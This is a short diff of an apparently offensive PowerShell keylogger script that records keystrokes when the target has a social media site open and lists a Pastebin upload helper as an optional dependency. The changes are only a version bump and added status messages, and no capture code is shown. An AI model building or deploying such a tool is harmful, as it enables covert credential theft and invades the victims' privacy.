@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
    Optional Dependencies: Out-PasteBin.ps1
-   PS cmdlet Dev version: v1.5.16
+   PS cmdlet Dev version: v1.5.17
    
 .DESCRIPTION
    Start recording keyboard keystrokes if target has
@@ -120,7 +120,7 @@
 
 
 Clear-Host
-$CmdletVersion = "v1.5.16"
+$CmdletVersion = "v1.5.17"
 $IPath = (Get-Location).Path
 $CurrentTime = (Get-Date -Format 'HH:mm')
 $ErrorActionPreference = "SilentlyContinue"
@@ -488,6 +488,9 @@ If($Mode -iMatch '^(start)$')
                If(-not(Test-Path -Path "$Env:TMP\pid.log"))
                {
                   ## Print info onscreen
+                  write-host "  🧶 Social media '" -ForegroundColor Green -NoNewline
+                  write-host "$SocialSite" -NoNewline
+                  write-host "' found active.." -ForegroundColor Green
                   write-host "`n   Browser Name    : $Item"
                   write-host "   Social Media    : $SocialSite"
                   write-host "   Logfile         : " -NoNewline
